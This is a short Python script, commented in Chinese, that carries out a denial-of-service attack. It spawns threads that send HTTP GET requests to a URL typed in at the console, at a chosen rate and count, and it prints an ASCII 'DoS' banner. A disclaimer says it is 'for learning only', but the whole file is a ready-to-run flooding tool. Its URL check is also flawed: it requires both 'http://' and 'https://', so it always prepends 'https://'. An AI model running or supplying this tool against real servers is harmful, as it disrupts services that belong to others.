import requests
from tqdm import tqdm
import threading
import time

"""
这个程序用于dos攻击，仅供学习用途，请勿乱用！
"""


def dos(url, bar):
    requests.get(url)  # 向服务器发送请求
    bar.update(1)  # 更新进度条


def doss(url, frequency, times):
    """
    dos(url, frequency, times)
    url: 要dos的url
    frequency: 每秒发送的请求数
    times: 要dos的次数
    """
    with tqdm(total=times, unit='req',
              bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}{postfix}]") as bar:
        for _ in range(times):
            thread = threading.Thread(target=dos, args=(url, bar))  # 创建线程
            thread.start()  # 启动线程
            time.sleep(1 / frequency)  # 用等待的方式控制发送请求的频率


if __name__ == '__main__':
    print('''                                       
            DDDDDDDDDDDDD                                          
            D::::::::::::DDD                                       
            D:::::::::::::::DD                                     
            DDD:::::DDDDD:::::D                                    
              D:::::D    D:::::D    ooooooooooo       ssssssssss   
              D:::::D     D:::::D oo:::::::::::oo   ss::::::::::s  
              D:::::D     D:::::Do:::::::::::::::oss:::::::::::::s 
              D:::::D     D:::::Do:::::ooooo:::::os::::::ssss:::::s
              D:::::D     D:::::Do::::o     o::::o s:::::s  ssssss 
              D:::::D     D:::::Do::::o     o::::o   s::::::s      
              D:::::D     D:::::Do::::o     o::::o      s::::::s   
              D:::::D    D:::::D o::::o     o::::ossssss   s:::::s 
            DDD:::::DDDDD:::::D  o:::::ooooo:::::os:::::ssss::::::s
            D:::::::::::::::DD   o:::::::::::::::os::::::::::::::s 
            D::::::::::::DDD      oo:::::::::::oo  s:::::::::::ss  
            DDDDDDDDDDDDD           ooooooooooo     sssssssssss    
            ''')
    # 示例频率，实际应用中应确保合法并考虑目标服务器承受能力
    url, frequency, times = input('url:'), int(input('frequency: ')), int(input('times: '))  # 从控制台获取dos参数
    if 'http://' not in url or 'https://' not in url:
        # 确保url以http://或https://开头
        url = 'https://' + url

    doss(url, frequency, times)  # 执行dos
    print('DoS done.')
